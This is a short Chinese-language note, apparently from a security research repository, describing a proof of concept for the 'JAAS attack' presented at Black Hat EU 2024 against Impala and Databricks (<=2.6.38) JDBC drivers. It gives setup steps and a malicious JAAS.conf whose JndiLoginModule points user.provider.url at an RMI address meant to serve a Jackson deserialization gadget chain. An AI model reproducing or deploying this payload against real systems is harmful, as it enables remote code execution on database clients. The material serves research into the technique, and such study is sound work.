# JAAS攻击

补充一个在black2024中的议题：[JAAS攻击](https://www.blackhat.com/eu-24/briefings/schedule/#a-novel-attack-surface-java-authentication-and-authorization-service-jaas-42179)

以下是使用impala和使用databricks数据库的poc，都是打的jackson反序列化（Databricks<=2.6.38）

首先将lib下的jar添加到库，然后开启一个httpserver，其下有JAAS.conf：
```java
Client{
	com.sun.security.auth.module.JndiLoginModule required
	user.provider.url="rmi://127.0.0.1:50388/c4708f"
	useFirstPass="true"
	group.provider.url="xxxx";
};
```
其中的`user.provider.url`替换为java-chains中的Jackson链地址


会议中还提了很多数据库的打法，payload都大同小异，有兴趣的可以自行阅读PDF